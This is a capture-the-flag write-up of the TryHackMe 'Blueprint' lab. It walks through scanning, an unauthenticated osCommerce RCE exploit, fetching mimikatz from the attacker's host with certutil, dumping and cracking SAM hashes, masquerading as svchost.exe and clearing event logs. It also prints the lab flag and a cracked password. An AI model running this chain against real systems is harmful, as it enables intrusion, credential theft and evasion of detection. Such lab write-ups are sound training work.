## TryHackMe | Blueprint ##

   • Target IP: 10.49.151.74

   • Attacker IP: 192.168.206.94

   • Platform: Window

   • Objective: Capture the root flag (root.txt.txt)


## 🛠️ Enviroment Setup 

I need to connect to TryHackMe server so i can directly use my kali to get this task done.

1. First i download the `ap-south-1-kmrlbhr-regular.ovpn` for TryHackMe from `TryHackMe | Access`

2. After finished downloaded the ovpn, I use :
   ```bash
   sudo openvpn ap-south-1-kmrlbhr-regular.ovpn
   ```

3. Next to ensure that i successfully connect with TryHackMe server, I use :
   ```bash
   ping 192.168.206.94
   ```
<img width="508" height="187" alt="ping tryhackme" src="https://github.com/user-attachments/assets/53e9b023-8478-4226-9612-56d54a28ece5" />

## 🔍 Stage 1: Reconnaissance & Scanning 

I used nmap to identify open ports, service versions, and run default scripts. Comprehensive port scan

```bash
sudo nmap -sC -sV -p- -T4 10.49.151.74
```

<img width="667" height="848" alt="Screenshot 2026-05-08 070210" src="https://github.com/user-attachments/assets/ce7fabfd-ff4b-4fd7-b84a-01fcabb506d3" />



 **Flag Breakdown** :

• -sC : Runs default Nmap scripts to check for common misconfigurations.

• -sV : Probes open ports to determine service and version information.

• -p- : Scans all 65,535 ports.

• -T4 : Sets the timing template to "Aggressive" for faster execution.

Findings:
| Port | State | Service | Version | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **80** | Open | HTTP | Microsoft IIS httpd 7.5 | Returning 404 for the root directory; potentially a decoy or misconfigured service. |
| **135/139** | Open | RPC/NetBIOS | Microsoft Windows RPC | Confirmed the target is a Windows-based system. |
| **443** | Open | HTTPS | Apache 2.4.23 (OpenSSL 1.0.2h) | **Critical:** Directory listing enabled. Exposed `/oscommerce-2.3.4/` and its subdirectories (`catalog/`, `docs/`). |
| **445** | Open | SMB | Windows 7 Home Basic 7601 SP1 | Identified OS version and hostname `BLUEPRINT`. Message signing is "enabled but not required." |
| **3306** | Open | MySQL | MariaDB 10.3.23 | Database service detected; currently "unauthorized" for remote root login. |
| **8080** | Open | HTTP | Apache 2.4.23 (OpenSSL 1.0.2h) | Mirroring Port 443; directory listing exposed `/oscommerce-2.3.4/` via a non-standard port. |
| **49152+** | Open | MSRPC | Microsoft Windows RPC | High-range ports used for standard Windows RPC communication. |

## Stage 2: Vulnerability Assessment 

Since I found osCommerce 2.3.4 during Stage 1, I use this stage to research how that software can be compromised.

```bash
searchsploit oscommerce 2.3.4
```

<img width="936" height="174" alt="searchsploit tryhackme" src="https://github.com/user-attachments/assets/43f07e76-2bc5-4eea-add2-74aeacce9da6" />


After discovering the **osCommerce 2.3.4** installation during the enumeration phase, I utilized `searchsploit` to cross-reference the exact version with known public exploits. The search revealed that this specific version is highly vulnerable to unauthenticated attacks.


| Vulnerability / Component | Type | Impact | Exploit / Source | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **osCommerce 2.3.4.1** | Remote Code Execution (RCE) | **Critical** | `44374.py` (Exploit-DB) | Unauthenticated RCE via the `/install` directory. This is the primary vector for gaining initial system access. |
| **osCommerce 2.3.4.1** | Remote Code Execution (RCE) | **Critical** | `50128.py` (Exploit-DB) | Alternative unauthenticated RCE script, useful if the primary payload fails. |
| **osCommerce 2.3.4.1** | Arbitrary File Upload | High | `43191.py` (Exploit-DB) | Allows for uploading a web shell, though typically requires higher access or specific misconfigurations compared to the RCE. |


**Assessment Conclusion:** 
The application has not been patched against critical RCE vulnerabilities. I will proceed to the Exploitation phase utilizing the `44374.py` exploit to achieve remote code execution.


## Stage 3: Exploitation 

• Using a publicly available exploit from [GitHub](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py) targeting osCommerce 2.3.4, remote command execution was:

```bash
python3 osCommerce2_3_4RCE.py http://10.49.151.74:8080/oscommerce-2.3.4/catalog
```

• The script confirmed that the install directory was available, indicating vulnerability. A test command injection returned the user context as:

```bash
User: nt authority\system
```

This demonstrated that commands could be executed on the host with SYSTEM privileges.

<img width="684" height="125" alt="Screenshot 2026-05-08 051205" src="https://github.com/user-attachments/assets/a06fba0d-f005-4067-b907-2e6337089584" />


## Stage 4: Post-Exploitation (Maintaining Access & Privilege Escalation) 

Once inside, I explores the system, gathers sensitive data, and attempts to secure my foothold. (Because the author already had SYSTEM privileges, I skipped Privilege Escalation and moved straight to credential harvesting).

I use `mimicatz.exe` as it's an open-source post-exploitation and credential-dumping tool.

First, I download `mimikatz.exe` at [mimikatz.exe](https://github.com/ParrotSec/mimikatz/blob/master/Win32/mimikatz.exe)

After that, I setup my server so that `mimikatz.exe` can be fetched by using:

```bash
python3 -m http.server 8000
```
<img width="604" height="176" alt="Screenshot 2026-05-08 060523" src="https://github.com/user-attachments/assets/40b47c09-334f-4b38-83e8-c5114801b7c4" />


The status **200** tells that `mimikatz.exe` is successfully fetched.

Next on the `RCE_SHELL$`:

```bash
certutil -urlcache -split -f http://192.168.206.94:8000/mimikatz.exe mimikatz.exe
```

<img width="746" height="89" alt="Screenshot 2026-05-08 061050" src="https://github.com/user-attachments/assets/d03ec058-f435-4ff6-a64a-dcb055252fd8" />


This command is a classic example of using a "Living off the Land Binary" (LOLBin). A LOLBin is a legitimate, pre-installed operating system tool that attackers (or penetration testers) abuse to perform actions they normally wouldn't be able to do easily, such as downloading malicious payloads without needing a dedicated web browser or custom download script.

```bash
****  Online  ****
  000000  ...
  0f2f08
CertUtil: -URLCache command completed successfully.
```
It confirms that the Windows target machine successfully reached out to my hosting server and downloaded my file.

```bash
.\mimikatz "lsadump::sam" exit
```

<img width="613" height="476" alt="Screenshot 2026-05-08 061153" src="https://github.com/user-attachments/assets/7a6ad90a-9af0-465e-b766-e0bd527f2163" />


• `.\mimikatz`
This tells the Windows command prompt to execute the mimikatz.exe application located in your current directory (the .\ specifies "right here in this folder").

• `"lsadump::sam"`
This is the specific instruction you are passing to Mimikatz.

   • lsadump is the Mimikatz module used to interact with Windows security and credential structures.

• `sam` targets the Security Account Manager (SAM) database. The SAM is a registry file in Windows that stores local user accounts and their passwords (stored as NTLM hashes, not plain text). This command extracts the System Key (SysKey) to decrypt the SAM database and print those hashes to your screen.

• `exit`
This final argument tells Mimikatz to terminate and return you to the standard Windows command prompt immediately after it finishes dumping the hashes.

**Cracking the Lab User NTLM Hash**

Using an online hash cracking service (hashes.com), the Lab user's NTLM hash was decrypted revealing the password:

Hash: 30e87bf999828446a1c1209ddde4c450

Password: googleplus

<img width="959" height="896" alt="Screenshot 2026-05-08 062415" src="https://github.com/user-attachments/assets/500d8de3-a73f-4190-9d00-f028382d2b12" />


**Capturing the Root Flag**

Finally, using system commands, the root flag file was read:

```bash
type C:\Users\Administrator\Desktop\root.txt.txt
```
FLAG : THM{aea1e3ce6fe7f89e10cea833ae009bee}

<img width="488" height="38" alt="Screenshot 2026-05-08 062704" src="https://github.com/user-attachments/assets/08aecc41-5f5e-4992-ab63-56a75965d1c8" />


## Stage 5 : Masquerading(If Want To Stay Longer) ## 

To evade basic string-based detection and manual file system audits, the primary post-exploitation tool was renamed using the ren command. By masquerading as svchost.exe, the technique attempts to blend in with legitimate Windows Service Host processes, although it remains susceptible to signature-based detection and heuristic analysis of the process path

```bash
dir
ren mimikatz.exe svchost.exe
dir
```

<img width="607" height="507" alt="Screenshot 2026-05-08 073547" src="https://github.com/user-attachments/assets/417a1b26-0327-46a7-a92a-2a34744bcb6d" />



## Stage 6 : Clear Track ##

Once the objectives (capturing the root flag) were met, the following steps were taken to remediate the forensic footprint:

   • Deleted the renamed svchost.exe binary.
   ```bash
   del svchost.exe
   dir
   ```

   • Cleared the Windows Event Logs using wevtutil cl System
   ```bash
   wevtutil cl System
   ```

<img width="600" height="285" alt="Screenshot 2026-05-08 074903" src="https://github.com/user-attachments/assets/00c265f3-425c-4076-a473-d79471c4255c" />

